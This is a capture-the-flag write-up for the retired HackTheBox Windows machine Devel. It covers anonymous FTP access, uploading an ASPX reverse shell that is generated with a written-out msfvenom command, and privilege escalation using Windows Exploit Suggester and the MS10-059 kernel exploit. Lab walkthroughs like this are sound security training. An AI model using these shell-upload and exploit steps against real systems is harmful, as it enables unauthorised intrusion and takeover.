---
title: Devel Hackthebox Writeup
date: 2020-12-18 09:00:00 +0800
categories: [Hackthebox, Retired]
tags: [windows,systeminfo,ftp anonymous,aspx,windows exploit suggester]     # TAG names should always be lowercase
image: /assets/img/devel-hackthebox/devel-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Devel:~$


Column | Details
------------ | -------------
Name | Devel
IP | 10.10.10.5
Points | 20
Os | Windows
Difficult | Easy
Creator | [ch4p](https://www.hackthebox.eu/home/users/profile/1)
Out on | 15th March 2017

# Summary:~$

* Discovering the new host and scanning for open ports.
* logging in as `anonymous` user in `ftp port`.
* Uploading an aspx `shell` via ftp and accessing it on `port 80` to get a reverse shell.
* Using `windows exploit suggester` for escalating privileges.
* using `MS10-059.exe` got `Root Privileges`.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/devel-hackthebox/nmap-scan-1.png)

Let's Check port `80`, which is a **Microsoft IIS httpd 7.5** server.

___
![](/assets/img/devel-hackthebox/port-80-2.png)

I tried `gobuster` for directory search, but it didn't worked out for me.

**Command** : *gobuster dir -u http://10.10.10.5/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100*

where   **t : threads**
        **| u : URL**
        **| w : wordlists**

___
![](/assets/img/devel-hackthebox/gobuster-3.png)

Then I tried logging in `ftp` as an `anonymous user` which worked. 

*Username*: `anonymous` | *Password*: `anonymous`

___
![](/assets/img/devel-hackthebox/ftp-anonyous-4.png)

Looking what's inside ftp 

___
![](/assets/img/devel-hackthebox/ftp-inside-5.png)

I tried accessing the `aspnet_client/` directory but it showed an *403 Forbidden Error*.

___
![](/assets/img/devel-hackthebox/aspent_client-access-denied-6.png)

I used gobuster on `aspnet_client/`, but it didn't worked out.

So I tried uploading a shell in the `ftp` using **put** command and accessing it via `port 80` to get a reverse shell.

Creating payload using `msfvenom` 

**Command**: *msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=1234 -f aspx > shell.aspx*

___
![](/assets/img/devel-hackthebox/msfvenom-payload-8.png)

Uploading it to `ftp`.

___
![](/assets/img/devel-hackthebox/uploaded-shell-ftp-9.png)

Accessing /shell.aspx on `port 80`.

We got a Shell.

___
![](/assets/img/devel-hackthebox/got-shell-10.png)

But I wasn't able to get the `User Flag` becasue we didn't had the permissions.

___
![](/assets/img/devel-hackthebox/no-access-11.png)

Let's first escalate the privileges, running `systeminfo` on the machine to get all the information.

___
![](/assets/img/devel-hackthebox/getting-systeminfo-for-privsec-13.png)

Feeding the above information to `windows exploit suggester` which I had downloaded on my machine.

Download link : [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

___
![](/assets/img/devel-hackthebox/exploit-suggester-results-14.png)

I tried using the `MS10-59` exploit for escalating privileges.

Download Link : [MS10-59.exe]( https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)

Uploading `MS10-59.exe` via ftp, just like we uploaded the aspx shell.

___
![](/assets/img/devel-hackthebox/escalating-privs-15.png)

When I tried escalating privileges, it threw me an `error` of *This program cannot be run in DOS mode.*

___
![](/assets/img/devel-hackthebox/cannot-run-in-DOS-mode-16.png)

I googled about this and found [this](https://superuser.com/questions/476808/i-am-getting-this-program-cannot-be-run-in-dos-mode-in-windows-xp).

Now sending the executable again but before that switching the `ftp` mode to `binary` first.

___
![](/assets/img/devel-hackthebox/transfering-0again-in-binary-mode-17.png)

Now Running the exploit and listenig on `nc`.

___
![](/assets/img/devel-hackthebox/got-shell-10.png)

Checking `whoami`.

___
![](/assets/img/devel-hackthebox/whoami-image-final.png)

Got `Root`.

